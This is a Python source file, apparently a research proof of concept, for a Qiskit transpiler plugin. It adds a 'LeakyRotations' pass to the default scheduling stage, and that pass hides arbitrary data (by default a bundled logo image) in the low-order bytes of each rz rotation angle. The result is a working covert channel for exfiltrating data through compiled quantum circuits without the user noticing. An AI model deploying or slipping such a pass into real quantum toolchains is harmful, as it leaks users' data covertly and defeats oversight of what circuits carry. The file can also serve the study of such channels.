import builtins
import struct
from pathlib import Path

from qiskit.converters import circuit_to_dag, dag_to_circuit
from qiskit.dagcircuit import DAGCircuit
from qiskit.transpiler import PassManager
from qiskit.transpiler.basepasses import TransformationPass
from qiskit.transpiler.preset_passmanagers.builtin_plugins import (
    DefaultSchedulingPassManager,
)
from qiskit.transpiler.preset_passmanagers.plugin import PassManagerStagePlugin


class LeakyRotations(TransformationPass):
    def run(self, dag: DAGCircuit):
        qc = dag_to_circuit(dag)
        new_dag = circuit_to_dag(qc)
        rotations = [node for node in new_dag.topological_op_nodes() if node.name == "rz"]

        try:
            block_size = builtins.block_size
        except AttributeError:
            block_size = 6

        max_data = block_size * len(rotations)

        try:
            data = builtins.data
        except AttributeError:
            with open(Path(__file__).parent / "HSLU_Logo_small.png", "rb") as file:
                data = file.read()

        # Case: no data to be leaked
        if not data:
            return

        # Case: data to be leaked too large for given circuit
        if len(data) > max_data:
            return

        leak = data + bytes(max_data - len(data))

        count = 0
        for rz in rotations:
            op = rz.op
            num = op.params[0]
            num_raw = bytearray(struct.pack("!d", num))
            num_raw[-block_size:] = leak[block_size * count : block_size * (count + 1)]
            new_num = struct.unpack("!d", num_raw)[0]
            op.params[0] = new_num
            new_dag.substitute_node(rz, op)
            count += 1

        return new_dag


class LeakySchedulingPlugin(PassManagerStagePlugin):
    """
    Plugin class for the leaky scheduling stage
    """

    def pass_manager(self, pass_manager_config, optimization_level=None) -> PassManager:
        default_scheduling = DefaultSchedulingPassManager()
        scheduling_pm = default_scheduling.pass_manager(pass_manager_config, optimization_level)
        scheduling_pm.append(LeakyRotations())
        return scheduling_pm
